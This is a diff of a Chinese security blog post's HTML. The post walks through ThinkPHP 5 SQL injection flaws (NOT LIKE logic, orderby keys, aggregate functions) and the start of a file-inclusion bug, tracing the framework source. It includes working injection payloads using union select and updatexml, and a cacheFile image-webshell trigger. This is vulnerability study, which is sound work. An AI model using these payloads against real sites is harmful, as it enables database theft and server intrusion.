+<pre><code>?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>前面提到了我们的输入会经过Request的get()方法。它会一路调用input()，getFilter(),filterValue(),filterExp()来处理我们的输入。</p>
+<pre><code class="php">public function filterExp(&amp;$value)
+{
+    // 过滤查询特殊字符
+    if (is_string($value) &amp;&amp; preg_match(&#39;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#39;, $value)) {
+        $value .= &#39; &#39;;
+    }
+    // TODO 其他安全过滤
+}</code></pre>
 <p>可以看到像之前的exp会被变成<code>exp</code>的处理。但是5.0.10版本的过滤是有问题的。问题出在<code>NOTLIKE</code>上。其更新版本的处理是加入了<code>NOT LIKE</code>.</p>
 <p>接下来跟上面那个全版本的sql注入可以按一样的流程走到parseWhereItem那。<br>我们的exp<code>not like</code>存在于this-&gt;exp这个数组.所以会进入底下<code>elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)</code>的分支</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'LIKE'</span> == $exp || <span class="string">'NOT LIKE'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// 模糊匹配</span></span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $item) &#123;</span><br><span class="line">        $array[] = $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($item, $field);</span><br><span class="line">    &#125;</span><br><span class="line">    $logic = <span class="keyword">isset</span>($val[<span class="number">2</span>]) ? $val[<span class="number">2</span>] : <span class="string">'AND'</span>;</span><br><span class="line">    $whereStr .= <span class="string">'('</span> . implode($array, <span class="string">' '</span> . strtoupper($logic) . <span class="string">' '</span>) . <span class="string">')'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $whereStr .= $key . <span class="string">' '</span> . $exp . <span class="string">' '</span> . <span class="keyword">$this</span>-&gt;parseValue($value, $field);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp) {
+// 模糊匹配
+if (is_array($value)) {
+    foreach ($value as $item) {
+        $array[] = $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseValue($item, $field);
+    }
+    $logic = isset($val[2]) ? $val[2] : &#39;AND&#39;;
+    $whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;
+} else {
+    $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseValue($value, $field);
+}</code></pre>
 <p>可以看到<code>$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;</code>这拼接了logic变量。而login会在传入了<code>val[2]</code>的时候取自<code>val[2]</code>。这是一个用户可控变量。所以可以达成sql注入。剩下的我们直接在前面构造一个合理的not like的语句就能在后面进行union select 从而拼出一个完整的sql语句。<br><img src="/2020/08/05/Thinkphp-vuln/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>今天先更这么多吧。看了php这么久果然还是nodejs更香……</p>
 <h2 id="tp5-sqli-orderby"><a href="#tp5-sqli-orderby" class="headerlink" title="tp5-sqli-orderby"></a>tp5-sqli-orderby</h2><p>Index.php配置如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $orderby = request()-&gt;get(<span class="string">'orderby'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; <span class="string">'byc_404'</span>])-&gt;order($orderby)-&gt;find();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $orderby = request()-&gt;get(&#39;orderby&#39;);
+        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;byc_404&#39;])-&gt;order($orderby)-&gt;find();
+        var_dump($result);
+    }
+}</code></pre>
 <p>(数据库中users表已有byc_404用户)<br>这里使用tp5.1.22版本。注入payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7e,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure>
-<p>从成功触发注入的位置我们可以看到sql语句如下</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> <span class="string">`username`</span> = <span class="string">'byc_404'</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="string">`id`</span>|updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#` LIMIT 1</span></span><br></pre></td></tr></table></figure>
-
+<pre><code>?orderby[id`|updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1</code></pre><p>从成功触发注入的位置我们可以看到sql语句如下</p>
+<pre><code class="sql">SELECT * FROM `users` WHERE `username` = &#39;byc_404&#39; ORDER BY `id`|updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1</code></pre>
 <p>跟下流程。首先5.1.22对输入做的过滤跟以往版本不太一样了。我们先看看get方法的处理</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get = $_GET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;get, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function get($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (empty($this-&gt;get)) {
+        $this-&gt;get = $_GET;
+    }
 
+    return $this-&gt;input($this-&gt;get, $name, $default, $filter);
+}</code></pre>
 <p>input()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">        <span class="comment">// 获取原始数据</span></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">        <span class="comment">// 解析name</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">        reset($data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">        <span class="comment">// 强制类型转换</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;typeCast($data, $type);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+{
+    if (false === $name) {
+        // 获取原始数据
+        return $data;
+    }
 
+    $name = (string) $name;
+    if (&#39;&#39; != $name) {
+        // 解析name
+        if (strpos($name, &#39;/&#39;)) {
+            list($name, $type) = explode(&#39;/&#39;, $name);
+        }
+
+        $data = $this-&gt;getData($data, $name);
+
+        if (is_null($data)) {
+            return $default;
+        }
+
+        if (is_object($data)) {
+            return $data;
+        }
+    }
+
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+        reset($data);
+    } else {
+        $this-&gt;filterValue($data, $name, $filter);
+    }
+
+    if (isset($type) &amp;&amp; $data !== $default) {
+        // 强制类型转换
+        $this-&gt;typeCast($data, $type);
+    }
+
+    return $data;
+}</code></pre>
 <p>可以看到如果我们的<code>$data</code>是数组的话。走的是<code>array_walk_recursive</code>。这个函数的作用是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : bool</span><br><span class="line">将用户自定义函数 callback 应用到 array 数组中的每个单元</span><br></pre></td></tr></table></figure>
+<pre><code>array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] ) : bool
+将用户自定义函数 callback 应用到 array 数组中的每个单元</code></pre><p>比如我写这样一个demo</p>
+<pre><code class="php">&lt;?php
 
-<p>比如我写这样一个demo</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"testtest1232333"</span>,<span class="string">"b##"</span>=&gt;<span class="string">"tes#tt##est"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">echo</span>($str.<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$end=array_walk_recursive($a,<span class="string">'sanitize'</span>);</span><br></pre></td></tr></table></figure>
+
+$a=array(&quot;a&quot;=&gt;&quot;testtest1232333&quot;,&quot;b##&quot;=&gt;&quot;tes#tt##est&quot;);
+
+function sanitize($str){
+    $str=str_replace(&quot;#&quot;,&quot;&quot;,$str);
+    echo($str.&quot;\n&quot;);
+}
+
+$end=array_walk_recursive($a,&#39;sanitize&#39;);</code></pre>
 <p>自定义一个回调函数将字符中间的<code>#</code>替换为空。其输出为<br><img src="/2020/08/05/Thinkphp-vuln/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>可以看到实际上只遍历了数组的值。没有处理数组的键。所以这里的filtervalue对数组的键没有任何影响。</p>
 <p>之后执行语句操作时。我们的where仍然跟前面一样。将值存储在<code>$options</code>数组中。而接受我们用户输入<code>order</code>方法也是一样、最终值被完整存进<code>$this-&gt;options[&#39;order&#39;]</code>中</p>
 <p>然后自然又是<code>find</code>了。它调用<code>Builder</code>类的<code>select</code>肯定已经非常熟悉了。不过这次我们orderby进入的是这个分支<code>$this-&gt;parseOrder($query, $options[&#39;order&#39;])</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span><span class="params">(Query $query, $order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'[rand]'</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">' '</span>, strpos($val, <span class="string">' '</span>) ? $val : $val . <span class="string">' '</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">'ASC'</span>, <span class="string">'DESC'</span>], <span class="keyword">true</span>) ? <span class="string">' '</span> . $sort : <span class="string">''</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="keyword">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">' ORDER BY '</span> . implode(<span class="string">','</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">protected function parseOrder(Query $query, $order)
+{
+    if (empty($order)) {
+        return &#39;&#39;;
+    }
+
+    $array = [];
+
+    foreach ($order as $key =&gt; $val) {
+        if ($val instanceof Expression) {
+            $array[] = $val-&gt;getValue();
+        } elseif (is_array($val)) {
+            $array[] = $this-&gt;parseOrderField($query, $key, $val);
+        } elseif (&#39;[rand]&#39; == $val) {
+            $array[] = $this-&gt;parseRand($query);
+        } else {
+            if (is_numeric($key)) {
+                list($key, $sort) = explode(&#39; &#39;, strpos($val, &#39; &#39;) ? $val : $val . &#39; &#39;);
+            } else {
+                $sort = $val;
+            }
+
+            $sort    = strtoupper($sort);
+            $sort    = in_array($sort, [&#39;ASC&#39;, &#39;DESC&#39;], true) ? &#39; &#39; . $sort : &#39;&#39;;
+            $array[] = $this-&gt;parseKey($query, $key, true) . $sort;
+        }
+    }
+
+    return &#39; ORDER BY &#39; . implode(&#39;,&#39;, $array);
+}</code></pre>
 <p>这里同样没有过滤。处理的函数只有一个parseKey。注意这里的parseKey是db/builder/Mysql.php中的parseKey。</p>
 <p><img src="/2020/08/05/Thinkphp-vuln/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>它对key的处理只是加了反引号环绕。因此其实没有做任何过滤。我们注入payload只需用注释符即可解决掉。</p>
 <p>最后官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 <code>)</code>、<code>#</code> 两个符号</p>
 <h2 id="tp5-sqli-Aggregatefunciton"><a href="#tp5-sqli-Aggregatefunciton" class="headerlink" title="tp5-sqli-Aggregatefunciton"></a>tp5-sqli-Aggregatefunciton</h2><p>tp5sql注入最后一个是mysql聚合函数导致的漏洞。 版本是5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25<br>不同版本利用payload需要微调。</p>
 <p>例如5.1.22版本payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?options&#x3D;id&#96;)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/08/05/Thinkphp-vuln/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>?options=id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#</code></pre><p><img src="/2020/08/05/Thinkphp-vuln/11.PNG" class="lazyload" data-srcset="11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>我们还是跟进源码。从前面几次的经验我们已经可以总结出,tp5存在漏洞的几个版本对输入的过滤基本没有或者可以使用数组绕过。此处我们的输入同样没有受到过滤影响。因此直接从<code>$result = db(&#39;users&#39;)-&gt;max($options);</code>这里跟进max函数。发现进而调用了<code>aggregate</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">($aggregate, $field, $force = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseOptions();</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;connection-&gt;aggregate(<span class="keyword">$this</span>, $aggregate, $field);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'fetch_sql'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($force) &#123;</span><br><span class="line">        $result = (float) $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>继续看到Connection类的aggregate</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aggregate</span><span class="params">(Query $query, $aggregate, $field)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $field = $aggregate . <span class="string">'('</span> . <span class="keyword">$this</span>-&gt;builder-&gt;parseKey($query, $field, <span class="keyword">true</span>) . <span class="string">') AS tp_'</span> . strtolower($aggregate);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;value($query, $field, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function aggregate($aggregate, $field, $force = false)
+{
+    $this-&gt;parseOptions();
 
+    $result = $this-&gt;connection-&gt;aggregate($this, $aggregate, $field);
+
+    if (!empty($this-&gt;options[&#39;fetch_sql&#39;])) {
+        return $result;
+    } elseif ($force) {
+        $result = (float) $result;
+    }
+
+    return $result;
+}</code></pre>
+<p>继续看到Connection类的aggregate</p>
+<pre><code class="php">public function aggregate(Query $query, $aggregate, $field)
+{
+    $field = $aggregate . &#39;(&#39; . $this-&gt;builder-&gt;parseKey($query, $field, true) . &#39;) AS tp_&#39; . strtolower($aggregate);
+
+    return $this-&gt;value($query, $field, 0);
+}</code></pre>
 <p>parsekey函数上面一个注入的例子提到了。是对我们的输入在两侧加反引号的作用。那么自然我们注入payload可以闭合加注释符解决掉。下面直接看value.value同样会调用我们非常熟悉的builder的select方法。只不过这次调用的是<code>parseField</code> 。最后还是没有做任何过滤处理。返回语句。</p>
 <p>完整语句如下</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MAX</span>(<span class="string">`id`</span>)+updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">#`) AS tp_max FROM `users` LIMIT 1</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="sql">SELECT MAX(`id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1</code></pre>
 <p>至此tp5的sql注入系列就结束了。明天开始先看rce,之后是反序列化pop链。</p>
 <h2 id="tp5-lfi"><a href="#tp5-lfi" class="headerlink" title="tp5-lfi"></a>tp5-lfi</h2><p>Index.php配置如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+use think\Controller;
+class Index extends Controller
+{
+    public function index()
+    {
+        $this-&gt;assign(request()-&gt;get());
+        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
+    }
+}</code></pre>
 <p>影响版本:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10</p>
 <p>使用<code>?cacheFile=1.jpg</code>(jpg为对应图片马)触发lfi.</p>
 <p>首先输入由<code>assign()</code>函数处理。我们一路跟到View类的<code>assign()</code>函数。</p>
